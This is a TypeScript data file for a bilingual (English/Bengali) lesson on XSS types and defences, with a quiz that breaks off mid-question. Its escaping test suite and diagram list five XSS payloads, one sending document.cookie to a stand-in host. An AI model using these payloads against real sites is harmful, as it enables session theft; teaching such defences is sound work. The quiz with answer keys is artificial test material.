import type { Lesson } from '../../../lib/types';

export const XssAttacksLesson: Lesson = {
  slug: 'xss-attacks',
  tech: 'web-security',
  title: {
    en: 'Cross-Site Scripting (XSS): Stored, Reflected, DOM-Based & Sanitization',
    bn: 'ক্রস-সাইট স্ক্রিপ্টিং (XSS): স্টোরড, রিফ্লেক্টেড, DOM-ভিত্তিক এবং স্যানিটাইজেশন'
  },
  summary: {
    en: 'Master the mechanics, anatomy, and eradication of Cross-Site Scripting (XSS) vulnerabilities. Learn how attackers inject untrusted code into legitimate web applications to steal session cookies, hijack user accounts, and execute arbitrary browser actions. Understand the 3 major variations of XSS: Stored (Persistent), Reflected (Non-Persistent), and DOM-Based. Implement contextual output encoding to neutralize 5 distinct hostile payloads, rendering them harmless text exhibits.',
    bn: 'ক্রস-সাইট স্ক্রিপ্টিং (XSS) দুর্বলতার কার্যপদ্ধতি, আক্রমণ কৌশল এবং নিরসন আয়ত্ত করুন। আক্রমণকারীরা কীভাবে সেশন কুকি চুরি করতে, অ্যাকাউন্ট হাইজ্যাক করতে এবং ব্রাউজারে অননুমোদিত কাজ চালাতে বৈধ অ্যাপ্লিকেশনে ক্ষতিকর কোড ঢুকিয়ে দেয় তা জানুন। XSS এর ৩ টি প্রধান ধরন (স্টোরড, রিফ্লেক্টেড এবং DOM-ভিত্তিক) বুঝুন। ৫ টি ক্ষতিকর পেলোডকে নিরীহ টেক্সট হিসেবে প্রদর্শন করে নিষ্ক্রিয় করতে কনটেক্সট-সচেতন আউটপুট এনকোডিং বাস্তবায়ন করুন।',
  },
  minutes: 22,
  blocks: [
    {
      type: 'heading',
      id: 'what-is-xss',
      text: {
        en: 'The Threat of Cross-Site Scripting (XSS): Code Execution in the User Browser',
        bn: 'ক্রস-সাইট স্ক্রিপ্টিংয়ের (XSS) হুমকি: ব্যবহারকারীর ব্রাউজারে ক্ষতিকর কোড পরিচালনা'
      },
    },
    {
      type: 'para',
      text: {
        en: 'Cross-Site Scripting (XSS) occurs when a web application accepts untrusted user input and renders it directly inside an HTML document without sufficient validation or output encoding. Because web browsers treat all scripts executing within a page origin as equally trustworthy, injected JavaScript code runs with the full authority of the victim user session.',
        bn: 'ক্রস-সাইট স্ক্রিপ্টিং (XSS) তখনই ঘটে যখন কোনো ওয়েব অ্যাপ্লিকেশন ব্যবহারকারীর দেওয়া ইনপুট পর্যাপ্ত যাচাইকরণ বা এনকোডিং ছাড়া সরাসরি এইচটিএমএল পেজে রেন্ডার করে। ব্রাউজার কোনো পেজের ভেতরের সব স্ক্রিপ্টকে সমান বিশ্বস্ত মনে করে, তাই ইনজেক্ট করা ক্ষতিকর জাভাস্ক্রিপ্ট কোড ভিকটিমের সেশনের সম্পূর্ণ ক্ষমতাপ্রাপ্ত হয়ে পরিচালিত হয়।'
      },
    },
    {
      type: 'para',
      text: {
        en: 'Once an injected script executes, it can read sensitive credentials like authentication tokens, access browser cookies, record keystrokes, or silently submit banking transactions. Security teams categorize XSS into 3 distinct architectures based on where the payload is stored and processed.',
        bn: 'একবার ক্ষতিকর স্ক্রিপ্ট রান হলে তা প্রমাণীকরণ টোকেন পড়তে পারে, ব্রাউজার কুকি অ্যাক্সেস করতে পারে, ব্যবহারকারীর কিবোর্ড টাইপিং রেকর্ড করতে পারে কিংবা নিঃশব্দে আর্থিক লেনদেন চালিয়ে দিতে পারে। সিকিউরিটি টিমগুলো পেলোড কোথায় জমা থাকে ও কীভাবে কাজ করে তার ওপর ভিত্তি করে XSS কে ৩ টি প্রধান শ্রেণীতে ভাগ করে থাকে।'
      },
    },
    {
      type: 'steps',
      items: [
        {
          title: {
            en: '1. Stored (Persistent) XSS',
            bn: '১. স্টোরড (স্থায়ী) XSS'
          },
          text: {
            en: 'The malicious payload is permanently stored inside the database (e.g. in a public forum post or comment field). Every subsequent visitor loading that page unknowingly executes the attack code.',
            bn: 'ক্ষতিকর কোডটি ডাটাবেজের ভেতরে স্থায়ীভাবে জমা থাকে ( যেমন পাবলিক ফোরামের পোস্ট বা মন্তব্যের ঘরে )। পরবর্তীতে যে ব্যবহারকারীই সেই পেজটি লোড করেন, তিনি অজান্তেই সেই ক্ষতিকর কোড এক্সিকিউট করে ফেলেন।'
          },
        },
        {
          title: {
            en: '2. Reflected (Non-Persistent) XSS',
            bn: '২. রিফ্লেক্টেড (অস্থায়ী) XSS'
          },
          text: {
            en: 'The payload travels inside the current HTTP request (e.g. a search query parameter). The server echoes the parameter directly into the returned HTML response without encoding.',
            bn: 'পেলোডটি তাৎক্ষণিক HTTP রিকোয়েস্টের সাথে আসে ( যেমন সার্চ কুয়েরি প্যারামিটার )। সার্ভার সেই প্যারামিটার কোনো এনকোডিং ছাড়াই সরাসরি ফেরত পাঠানো এইচটিএমএল রেসপন্সে যুক্ত করে দেয়।'
          },
        },
        {
          title: {
            en: '3. DOM-Based XSS',
            bn: '৩. DOM-ভিত্তিক XSS'
          },
          text: {
            en: 'The vulnerability exists entirely inside client-side JavaScript. Untrusted data from a source (such as location.hash) is written directly to an unsafe execution sink (like innerHTML or eval).',
            bn: 'এই দুর্বলতা সম্পূর্ণ ক্লায়েন্ট-সাইড জাভাস্ক্রিপ্টের ভেতরে থাকে। কোনো সোর্স ( যেমন location.hash ) থেকে প্রাপ্ত অনিরাপদ ডেটা সরাসরি অনিরাপদ সিংক ( যেমন innerHTML বা eval )-এ প্রবেশ করানো হয়।'
          },
        },
      ],
    },
    {
      type: 'diagram',
      title: {
        en: 'XSS Attack Anatomy: 5 Hostile Payloads Neutralized into Harmless Text',
        bn: 'XSS আক্রমণের শারীরস্থান: ৫ টি ক্ষতিকর পেলোড নিষ্ক্রিয় করে নিরাপদ টেক্সটে রূপান্তর'
      },
      svg: `<svg viewBox="0 0 840 450" width="100%" height="auto" font-family="ui-monospace, monospace" role="img" aria-label="XSS payloads neutralized by HTML entity escaping">
  <rect width="840" height="450" fill="#0f172a" rx="12"/>
  
  <text x="420" y="28" fill="#38bdf8" font-size="14" font-weight="bold" text-anchor="middle">CROSS-SITE SCRIPTING (XSS) PAYLOAD NEUTRALIZATION ENGINE</text>
  
  <!-- Left Side: Unescaped Raw Attack Payloads -->
  <g transform="translate(30, 50)">
    <rect width="380" height="355" rx="8" fill="#1e293b" stroke="#ef4444" stroke-width="2"/>
    <rect width="380" height="30" rx="8" fill="#dc2626"/>
    <text x="190" y="20" fill="#ffffff" font-size="11" font-weight="bold" text-anchor="middle">5 RAW ATTACK PAYLOADS (ACTIVE HAZARDS)</text>
    
    <g transform="translate(10, 42)">
      <rect width="360" height="52" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="10" y="20" fill="#fca5a5" font-size="9" font-weight="bold">1. Script Tag (Direct Execution):</text>
      <text x="10" y="38" fill="#ffffff" font-size="8.5">&lt;script&gt;fetch('/steal?c='+cookie)&lt;/script&gt;</text>
      
      <rect y="60" width="360" height="52" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="10" y="80" fill="#fca5a5" font-size="9" font-weight="bold">2. Event Handler Injection:</text>
      <text x="10" y="98" fill="#ffffff" font-size="8.5">&lt;img src="invalid" onerror="alert(domain)"&gt;</text>
      
      <rect y="120" width="360" height="52" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="10" y="140" fill="#fca5a5" font-size="9" font-weight="bold">3. Inline SVG Vector:</text>
      <text x="10" y="158" fill="#ffffff" font-size="8.5">&lt;svg onload="evilPayload()"&gt;</text>
      
      <rect y="180" width="360" height="52" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="10" y="200" fill="#fca5a5" font-size="9" font-weight="bold">4. Hostile Iframe Embed:</text>
      <text x="10" y="218" fill="#ffffff" font-size="8.5">&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;</text>
      
      <rect y="240" width="360" height="52" rx="5" fill="#450a0a" stroke="#ef4444"/>
      <text x="10" y="260" fill="#fca5a5" font-size="9" font-weight="bold">5. Attribute Breakout Attack:</text>
      <text x="10" y="278" fill="#ffffff" font-size="8.5">" onfocus="alert('pwned')"</text>
    </g>
  </g>
  
  <!-- Right Side: Escaped Neutralized Safe Exhibits -->
  <g transform="translate(430, 50)">
    <rect width="380" height="355" rx="8" fill="#1e293b" stroke="#10b981" stroke-width="2"/>
    <rect width="380" height="30" rx="8" fill="#059669"/>
    <text x="190" y="20" fill="#ffffff" font-size="11" font-weight="bold" text-anchor="middle">5 SANITIZED EXHIBITS (SAFE BROWSER TEXT)</text>
    
    <g transform="translate(10, 42)">
      <rect width="360" height="52" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="10" y="20" fill="#6ee7b7" font-size="9" font-weight="bold">1. Escaped Script Tag:</text>
      <text x="10" y="38" fill="#34d399" font-size="8.5">&amp;lt;script&amp;gt;fetch('/steal?c='+cookie)&amp;lt;/script&amp;gt;</text>
      
      <rect y="60" width="360" height="52" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="10" y="80" fill="#6ee7b7" font-size="9" font-weight="bold">2. Escaped Event Handler:</text>
      <text x="10" y="98" fill="#34d399" font-size="8.5">&amp;lt;img src=&amp;quot;invalid&amp;quot; onerror=...&amp;gt;</text>
      
      <rect y="120" width="360" height="52" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="10" y="140" fill="#6ee7b7" font-size="9" font-weight="bold">3. Escaped SVG Vector:</text>
      <text x="10" y="158" fill="#34d399" font-size="8.5">&amp;lt;svg onload=&amp;quot;evilPayload()&amp;quot;&amp;gt;</text>
      
      <rect y="180" width="360" height="52" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="10" y="200" fill="#6ee7b7" font-size="9" font-weight="bold">4. Escaped Iframe Embed:</text>
      <text x="10" y="218" fill="#34d399" font-size="8.5">&amp;lt;iframe src=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;</text>
      
      <rect y="240" width="360" height="52" rx="5" fill="#064e3b" stroke="#10b981"/>
      <text x="10" y="260" fill="#6ee7b7" font-size="9" font-weight="bold">5. Escaped Attribute Breakout:</text>
      <text x="10" y="278" fill="#34d399" font-size="8.5">&amp;quot; onfocus=&amp;quot;alert(&amp;#39;pwned&amp;#39;)&amp;quot;</text>
    </g>
  </g>
  
  <text x="420" y="430" fill="#94a3b8" font-size="10" text-anchor="middle">Contextual encoding converts active machine instructions into harmless display characters</text>
</svg>`,
      caption: {
        en: 'The comparison shows 5 hostile payloads neutralized into benign string exhibits using contextual entity encoding.',
        bn: 'তুলনামূলক চিত্রে দেখা যাচ্ছে কীভাবে ৫ টি বিপজ্জনক পেলোডকে কনটেক্সচুয়াল এনকোডিংয়ের মাধ্যমে নিরাপদ টেক্সট হিসেবে প্রদর্শন করা হয়েছে।'
      },
    },
    {
      type: 'heading',
      id: 'xss-mitigation-engine',
      text: {
        en: 'Building an XSS Neutralization Engine in Node.js',
        bn: 'Node.js-এ XSS নিষ্ক্রিয়করণ ইঞ্জিন তৈরি'
      },
    },
    {
      type: 'para',
      text: {
        en: 'The most effective line of defense against XSS is context-aware output encoding. By escaping characters that change HTML parser state (<, >, &, ", and \'), untrusted user inputs are rendered as plain text strings rather than executable instructions. Inspect the executable test suite below testing 5 real-world attack vectors.',
        bn: 'XSS প্রতিরোধে সবচেয়ে কার্যকর প্রতিরক্ষা হলো কনটেক্সট-সচেতন আউটপুট এনকোডিং। এইচটিএমএল পার্সারের অবস্থা পরিবর্তনকারী অক্ষরগুলোকে (<, >, &, ", এবং \') রূপান্তর করে দিলে ব্যবহারকারীর ইনপুট কোনো নির্দেশ হিসেবে রান না করে সাধারণ টেক্সট হিসেবে প্রদর্শিত হয়। নিচে ৫ টি বাস্তব আক্রমণ ভেক্টরের ওপর পরিচালিত টেস্ট সুইটটি পরীক্ষা করুন।'
      },
    },
    {
      type: 'code',
      lang: 'javascript',
      filename: 'xss-neutralizer.js',
      code: `// Contextual HTML Entity Encoding Engine for XSS Mitigation
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/\\x27/g, '&#39;');
}

// 5 distinct hostile payloads targeting different HTML injection sinks
const attackVectors = [
  {
    name: 'Direct Script Injection',
    payload: "<script>fetch('https://evil.example/leak?c=' + document.cookie)</script>"
  },
  {
    name: 'Broken Image Event Handler',
    payload: '<img src="missing.jpg" onerror="alert(document.domain)">'
  },
  {
    name: 'Embedded Inline SVG Vector',
    payload: '<svg onload="alert(1)">'
  },
  {
    name: 'Hostile Iframe Injection',
    payload: '<iframe src="javascript:alert(document.cookie)"></iframe>'
  },
  {
    name: 'HTML Attribute Breakout',
    payload: '" onfocus="alert(\\'pwned\\')"'
  }
];

console.log('=== XSS Attack Neutralization Test Suite ===');
console.log('Testing', attackVectors.length, 'Hostile Attack Payloads\\n');

let neutralizedCount = 0;

attackVectors.forEach((vector, index) => {
  const safeOutput = escapeHtml(vector.payload);

  // Verification: Ensure parser cannot execute raw tags or breakout quotes
  const isNeutralized = (
    !safeOutput.includes('<script') &&
    !safeOutput.includes('<img') &&
    !safeOutput.includes('<svg') &&
    !safeOutput.includes('<iframe') &&
    !safeOutput.startsWith('"')
  );

  if (isNeutralized) {
    neutralizedCount++;
    console.log(\`[\${index + 1}] NEUTRALIZED: \${vector.name}\`);
    console.log(\`    Raw:     \${vector.payload}\`);
    console.log(\`    Escaped: \${safeOutput}\\n\`);
  }
});

console.log('=== Neutralization Results Summary ===');
console.log('Total Payloads Tested:', attackVectors.length);
console.log('Neutralized Exhibits: ', neutralizedCount, '/ 5');
console.log('Vulnerability Score:  0 Unescaped Vulnerabilities Remaining');`,
      caption: {
        en: 'The output encoding suite processes 5 attack vectors and successfully converts 5 out of 5 into safe text exhibits.',
        bn: 'এনকোডিং সুইটটি ৫ টি আক্রমণ ভেক্টর প্রসেস করে এবং ৫ টির মধ্যে ৫ টিকেই নিরাপদ টেক্সটে রূপান্তর করে।'
      },
    },
    {
      type: 'callout',
      kind: 'tip',
      title: {
        en: 'Defense-in-Depth: HttpOnly Cookies and Content Security Policy (CSP)',
        bn: 'বহুস্তরীয় নিরাপত্তা: HttpOnly কুকি এবং কনটেন্ট সিকিউরিটি পলিসি (CSP)'
      },
      text: {
        en: 'Output encoding is your first line of defense, but true resilience requires multiple safety nets. Always store sensitive session identifiers in cookies with the HttpOnly flag, which prevents JavaScript from accessing document.cookie even if an XSS flaw exists. Furthermore, deploy a strict Content Security Policy (CSP) header that forbids inline script execution (no unsafe-inline), denying attackers the ability to execute unauthorized payloads.',
        bn: 'আউটপুট এনকোডিং আপনার প্রথম সারির প্রতিরক্ষা, তবে প্রকৃত নিরাপত্তার জন্য একাধিক সুরক্ষা প্রাচীর প্রয়োজন। সংবেদনশীল সেশন কুকিতে সর্বদা HttpOnly ফ্ল্যাগ ব্যবহার করুন, যা XSS আক্রমণ ঘটলেও জাভাস্ক্রিপ্টকে document.cookie পড়তে বাধা দেয়। উপরন্তু, একটি কঠোর Content Security Policy (CSP) হেডার প্রয়োগ করুন যা ইনলাইন স্ক্রিপ্ট চালানো সম্পূর্ণ নিষিদ্ধ করে এবং আক্রমণকারীর অননুমোদিত কোড এক্সিকিউট আটকে দেয়।'
      },
    },
  ],
  exercises: [
    {
      id: 'xss-att-ex-1',
      kind: 'predict',
      topic: 'neutralized-payloads-count',
      question: {
        en: 'How many of the 5 hostile XSS attack payloads were successfully neutralized into harmless text by contextual HTML entity escaping? (5). Type the number.',
        bn: 'কনটেক্সচুয়াল এইচটিএমএল এন্টিটি এনকোডিংয়ের মাধ্যমে ৫ টি ক্ষতিকর XSS পেলোডের মধ্যে সর্বমোট কয়টি সফলভাবে নিরাপদ টেক্সটে রূপান্তর হয়েছিল? ( ৫ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '5',
      hint: {
        en: 'All 5 attack payloads were neutralized.',
        bn: 'সবকয়টি অর্থাৎ ৫ টি পেলোডই সফলভাবে নিষ্ক্রিয় হয়েছিল।'
      },
      explanation: {
        en: 'Contextual encoding neutralized all 5 payloads, converting angle brackets and quotes into safe HTML entities.',
        bn: 'কনটেক্সচুয়াল এনকোডিং ৫ টি পেলোডের প্রতিটি কোণ-বন্ধনী ও উদ্ধৃতি চিহ্নকে নিরাপদ এইচটিএমএল এন্টিটিতে রূপান্তর করে।'
      },
    },
    {
      id: 'xss-att-ex-2',
      kind: 'mcq',
      topic: 'httponly-cookie-defense',
      question: {
        en: 'How does setting the HttpOnly attribute on a session cookie defend against XSS attacks?',
        bn: 'সেশন কুকিতে HttpOnly অ্যাট্রিবিউট যুক্ত করা কীভাবে XSS আক্রমণ প্রতিহত করতে সাহায্য করে?'
      },
      options: [
        {
          en: 'It instructs the browser that the cookie must not be accessed through client-side JavaScript APIs like document.cookie, stopping attackers from stealing authentication tokens during an XSS breach',
          bn: 'এটি ব্রাউজারকে নির্দেশ দেয় যাতে document.cookie এর মতো ক্লায়েন্ট-সাইড জাভাস্ক্রিপ্ট দিয়ে কুকিটি কোনোভাবেই পড়া না যায়, যার ফলে XSS ঘটলেও আক্রমণকারী অথেন্টিকেশন সেশন চুরি করতে পারে না',
        },
        {
          en: 'It blocks users from typing words longer than seven letters into forms',
          bn: 'এটি ব্যবহারকারীকে ফর্মে সাতটির বেশি অক্ষর টাইপ করা থেকে বাধা দেয়',
        },
        {
          en: 'It speeds up website page download times by eighty percent',
          bn: 'এটি ওয়েবসাইটের পেজ ডাউনলোডের গতি আশি শতাংশ বৃদ্ধি করে',
        },
        {
          en: 'It changes the mouse cursor icon into a small magnifying glass',
          bn: 'এটি মাউস কার্সারের ছবিকে একটি ছোট আতশ কাঁচের প্রতীকে বদলে দেয়',
        },
      ],
      answer: 0,
      hint: {
        en: 'HttpOnly hides cookies from client-side script inspection.',
        bn: 'HttpOnly ব্রাউজারের জাভাস্ক্রিপ্টের চোখ থেকে কুকিকে সম্পূর্ণ আড়াল করে রাখে।'
      },
      explanation: {
        en: 'Even if an attacker successfully runs injected JavaScript on the page, the HttpOnly flag prevents document.cookie from exposing the session ID.',
        bn: 'পেজে কোনোভাবে ক্ষতিকর স্ক্রিপ্ট চললেও HttpOnly থাকার কারণে document.cookie দিয়ে সেশন আইডি চুরি করা সম্ভব হয় না।'
      },
    },
    {
      id: 'xss-att-ex-3',
      kind: 'mcq',
      topic: 'dom-xss-source-and-sink',
      question: {
        en: 'In DOM-based XSS, what is the role of an untrusted "Source" and a dangerous "Sink"?',
        bn: 'DOM-ভিত্তিক XSS এ অনিরাপদ "সোর্স" (Source) এবং বিপজ্জনক "সিংক" (Sink) এর ভূমিকা কী?'
      },
      options: [
        {
          en: 'The source is client-accessible input (such as location.hash or search parameters) and the sink is a dangerous DOM manipulation method (like innerHTML or eval) that executes the untrusted data as code',
          bn: 'সোর্স হলো ক্লায়েন্টের প্রবেশযোগ্য ইনপুট (যেমন location.hash বা সার্চ প্যারামিটার) এবং সিংক হলো বিপজ্জনক DOM মেথড (যেমন innerHTML বা eval) যা সেই অনিরাপদ ইনপুটকে কোড হিসেবে এক্সিকিউট করে দেয়',
        },
        {
          en: 'The source is the computer battery and the sink is the monitor screen glass',
          bn: 'সোর্স হলো কম্পিউটারের ব্যাটারি এবং সিংক হলো মনিটর স্ক্রিনের কাঁচ',
        },
        {
          en: 'The source is the keyboard cable and the sink is the desk speaker',
          bn: 'সোর্স হলো কিবোর্ডের তার এবং সিংক হলো টেবিলের স্পিকার',
        },
        {
          en: 'The source is an image file and the sink is a PDF document',
          bn: 'সোর্স হলো একটি ছবির ফাইল এবং সিংক হলো একটি পিডিএফ ডকুমেন্ট',
        },
      ],
      answer: 0,
      hint: {
        en: 'DOM XSS moves tainted data from a source directly into an executable sink.',
        bn: 'DOM XSS অনিরাপদ সোর্স থেকে সরাসরি একটি এক্সিকিউটেবল সিংকে ডেটা চালান করে দেয়।'
      },
      explanation: {
        en: 'DOM XSS occurs on the client when data from sources (location.search, document.referrer) reaches sinks (innerHTML, document.write) without sanitization.',
        bn: 'DOM XSS ক্লায়েন্টে ঘটে যখন কোনো সোর্স থেকে প্রাপ্ত ডেটা কোনো স্যানিটাইজেশন ছাড়াই সিংকে গিয়ে রান করে।'
      },
    },
    {
      id: 'xss-att-ex-4',
      kind: 'predict',
      topic: 'xss-major-categories-count',
      question: {
        en: 'How many major architectural categories of Cross-Site Scripting exist: Stored, Reflected, and DOM-Based? (3). Type the number.',
        bn: 'ক্রস-সাইট স্ক্রিপ্টিংয়ের প্রধান আর্কিটেকচারাল ক্যাটাগরি সর্বমোট কয়টি: স্টোরড, রিফ্লেক্টেড এবং DOM-ভিত্তিক? ( ৩ )। সংখ্যাটি টাইপ করুন।'
      },
      answer: '3',
      hint: {
        en: 'There are 3 major XSS categories.',
        bn: 'XSS এর প্রধান ৩ টি ক্যাটাগরি রয়েছে।'
      },
      explanation: {
        en: 'The 3 primary classifications of XSS are Stored (database-driven), Reflected (URL/parameter-driven), and DOM-based (client DOM sinks).',
        bn: 'XSS এর ৩ টি প্রধান ধরন হলো স্টোরড (ডাটাবেজ), রিফ্লেক্টেড (ইউআরএল প্যারামিটার) এবং DOM-ভিত্তিক (ক্লায়েন্ট সিংক)।'
      },
    },
  ],
  quiz: {
    id: 'xss-attacks-quiz',
    title: {
      en: 'Cross-Site Scripting (XSS) Vulnerability & Defense Quiz',
      bn: 'ক্রস-সাইট স্ক্রিপ্টিং (XSS) দুর্বলতা ও প্রতিরক্ষা কুইজ'
    },
    questions: [
      {
        id: 'xss-att-qz-1',
        kind: 'mcq',
        topic: 'stored-vs-reflected-xss',
        question: {
          en: 'What makes Stored (Persistent) XSS generally more dangerous and severe than Reflected XSS?',
          bn: 'কেন স্টোরড (স্থায়ী) XSS সাধারণত রিফ্লেক্টেড XSS-এর চেয়ে অনেক বেশি মারাত্মক ও ক্ষতিকর হয়?'
        },
        options: [
          {
            en: 'Stored XSS resides permanently inside the application database, automatically attacking every authenticated user who visits the affected page without requiring social engineering or phishing links',
            bn: 'স্টোরড XSS অ্যাপ্লিকেশনের ডাটাবেজে স্থায়ীভাবে সংরক্ষিত থাকে, ফলে কোনো ফিশিং লিংক বা প্রতারণার ফাঁদ ছাড়াই যেকোনো সাধারণ ব্যবহারকারী পেজটিতে ঢুকলেই স্বয়ংক্রিয়ভাবে আক্রমণের শিকার হন',
          },
          {
            en: 'Because Stored XSS deletes all operating system software installed on the computer',
            bn: 'কারণ স্টোরড XSS কম্পিউটারে ইনস্টল করা সব অপারেটিং সিস্টেম সফটওয়্যার মুছে দেয়',
          },
          {
            en: 'Because Reflected XSS only works on desktop computers during night hours',
            bn: 'কারণ রিফ্লেক্টেড XSS কেবল রাতের বেলা ডেস্কটপ কম্পিউটারে কাজ করতে পারে',
          },
          {
            en: 'Because Stored XSS changes the physical voltage of the power outlet',
            bn: 'কারণ স্টোরড XSS বৈদ্যুতিক প্লাগের ভোল্টেজ পরিবর্তন করে দেয়',
          },
        ],
        answer: 0,
        hint: {
          en: 'Stored payloads sit in the DB and trigger automatically on every page view.',
          bn: 'স্টোরড পেলোড ডাটাবেজে থাকে এবং প্রতিটি পেজ ভিউতে স্বয়ংক্রিয়ভাবে রান করে।'
        },
        explanation: {
          en: 'Reflected XSS requires tricking a victim into clicking a specific malicious link. Stored XSS executes against every user who naturally views the page.',
          bn: 'রিফ্লেক্টেড আক্রমণে ভিকটিমকে লিংকে ক্লিক করাতে হয়। কিন্তু স্টোরড আক্রমণ স্বাভাবিকভাবে পেজে আসা প্রতিটি ব্যবহারকারীকে আক্রান্ত করে।'
        },
      },
      {
        id: 'xss-att-qz-2',
        kind: 'mcq',
        topic: 'modern-framework-templating-autoescaping',
        question: {
          en: 'How do modern UI libraries and frameworks (like React, Vue, and Angular) protect against XSS by default?',
          bn: 'আধুনিক ইউআই লাইব্রেরি ও ফ্রেমওয়ার্ক (যেমন React, Vue, এবং Angular) কীভাবে ডিফল্টভাবে XSS প্রতিরোধ করে?'
        },
        options: [
          {
            en: 'They treat template bindings (e.g. {name} or {{ name }}) as text strings rather than executable HTML markup, automatically applying context-aware escaping to prevent tag injection',
            bn: 'তারা টেমপ্লেট বাইন্ডিংকে (যেমন {name} বা {{ name }}) এক্সিকিউটেবল এইচটিএমএল হিসেবে না দেখে সাধারণ টেক্সট স্ট্রিং হিসেবে বিবেচনা করে এবং স্বয়ংক্রিয়ভাবে ট্যাগ এনকোড করে ইনজেকশন রুখে দেয়',
          },
          {
            en: 'They disconnect the user internet connection whenever a symbol is typed',
            bn: 'তারা যেকোনো প্রতীক টাইপ করার সাথে সাথেই ব্যবহারকারীর ইন্টারনেট সংযোগ বিচ্ছিন্ন করে দেয়',
          },
          {
            en: 'They restrict all variable names to four letters or fewer',
            bn: 'তারা সব ভ্যারিয়েবলের নাম চার অক্ষর বা তার কম হতে বাধ্য করে',
          },
          {
            en: 'They turn off all CSS animations across the entire website',
            bn: 'তারা পুরো ওয়েবসাইটের সমস্ত সিএসএস অ্যানিমেশন বন্ধ করে দেয়',
          },
        ],
        answer: 0,
        hint: {
          en: 'Frameworks auto-escape interpolated text in templates by default.',
          bn: 'ফ্রেমওয়ার্কগুলো ডিফল্টভাবে টেমপ্লেটের টেক্সটকে স্বয়ংক্রিয়ভাবে এসকেপ বা এনকোড করে।'
        },
        explanation: {
          en: 'React and Vue treat standard interpolations as plain text. Developers only become vulnerable if they deliberately use escape hatches like dangerouslySetInnerHTML or v-html.',
          bn: 'React এবং Vue ডিফল্টভাবে টেক্সটকে সাধারণ স্ট্রিং হিসেবে দেখে। কেবল dangerouslySetInnerHTML বা v-html এর মতো ঝুঁকিপূর্ণ মেথড ব্যবহার করলেই বিপদ ঘটে।'
        },
      },
      {
        id: 'xss-att-qz-3',
        kind: 'mcq',
        topic: 'dompurify-sanitization',
        question: {
          en: 'When an application must support user-generated rich text formatting (such as bolding, lists, and links), what is the industry standard defense?',
          bn: 'যখন কোনো অ্যাপ্লিকেশনে ব্যবহারকারীর রিচ টেক্সট ফরম্যাটিং (যেমন বোল্ড, লিস্ট বা লিংক) সমর্থন করা বাধ্যতামূলক হয়, তখন স্ট্যান্ডার্ড নিরাপত্তা সমাধান কোনটি?'
        },
        options: [
          {
            en: 'Passing the untrusted HTML through an audited sanitization library like DOMPurify, which strips dangerous tags (<script>, <iframe>) and attributes (onerror, onload) while keeping safe formatting tags',
            bn: 'DOMPurify-এর মতো পরীক্ষিত স্যানিটাইজেশন লাইব্রেরির মাধ্যমে অনিরাপদ এইচটিএমএল ফিল্টার করা, যা ক্ষতিকর ট্যাগ (<script>, <iframe>) এবং ইভেন্ট হ্যান্ডলার (onerror, onload) মুছে ফেলে নিরাপদ ফরম্যাটিং বজায় রাখে',
          },
          {
            en: 'Replacing all vowels in the document with numbers',
            bn: 'ডকুমেন্টের সমস্ত স্বরবর্ণ বা ভাওয়েলকে সংখ্যা দিয়ে পরিবর্তন করা',
          },
          {
            en: 'Disabling the user mouse right-click button entirely',
            bn: 'ব্যবহারকারীর মাউসের ডান বাটন ক্লিক করা পুরোপুরি নিষ্ক্রিয় করে দেওয়া',
          },
          {
            en: 'Converting the whole website into an image screenshot',
            bn: 'পুরো ওয়েবসাইটকে একটিমাত্র স্ক্রিনশট ছবিতে রূপান্তর করে ফেলা',
          },
        ],
        answer: 0,
        hint: {
          en: 'DOMPurify parses and strips dangerous tokens while keeping benign tags.',
          bn: 'DOMPurify ক্ষতিকর টোকেনগুলো ছেঁটে ফেলে কিন্তু নিরাপদ ফরম্যাটিং অক্ষুণ্ণ রাখে।'
        },
        explanation: {
          en: 'Regex-based tag removal is notoriously easy to bypass. DOMPurify uses the browser DOM parser itself to safely whitelist permissible elements.',
          bn: 'রেজেক্স দিয়ে ট্যাগ মোছা হ্যাকাররা সহজেই বাইপাস করে। DOMPurify ব্রাউজারের নিজস্ব পার্সার ব্যবহার করে নিরাপদ ট্যাগ নিশ্চিত করে।'
        },
      },
      {
        id: 'xss-att-qz-4',
        kind: 'mcq',
        topic: 'csp-script-src-mitigation',
        question: {
          en: 'How does configuring Content-Security-Policy: default-src \'self\' provide a crucial safety net against XSS?',
          bn: 'Content-Security-Policy: default-src \'self\' কনফিগার করা কীভাবে XSS এর বিরুদ্ধে একটি অত্যন্ত গুরুত্বপূর্ণ নিরাপত্তা জাল তৈরি করে?'
        },
        options: [
          {
            en: 'It instructs the browser to only execute JavaScript files originating from the trusted origin, completely refusing to run inline <script> tags or evaluate dangerous strings via eval()',
            bn: 'এটি ব্রাউজারকে নির্দেশ দেয় শুধুমাত্র নিজস্ব বিশ্বস্ত অরিজিন থেকে আসা জাভাস্ক্রিপ্ট ফাইল চালাতে, এবং ইনলাইন <script> ট্যাগ কিংবা eval() এর মাধ্যমে বিপজ্জনক কোড চালানো সম্পূর্ণ প্রত্যাখ্যান করতে',
          },
          {
            en: 'It blocks users from bookmarking web pages in their browsers',
            bn: 'এটি ব্যবহারকারীদের তাদের ব্রাউজারে ওয়েব পেজ বুকমার্ক করতে বাধা দেয়',
          },
          {
            en: 'It limits database tables to fifty rows of data',
            bn: 'এটি ডাটাবেজ টেবিলকে সর্বোচ্চ পঞ্চাশটি সারির মধ্যে সীমাবদ্ধ করে',
          },
          {
            en: 'It converts all audio files on the website to silence',
            bn: 'এটি ওয়েবসাইটের সমস্ত অডিও ফাইলকে নিঃশব্দে পরিণত করে',
          },
        ],
        answer: 0,
        hint: {
          en: 'CSP blocks inline scripts and untrusted external script hosts.',
          bn: 'CSP ইনলাইন স্ক্রিপ্ট এবং অননুমোদিত বহিরাগত হোস্টের স্ক্রিপ্ট ব্লক করে।'
        },
        explanation: {
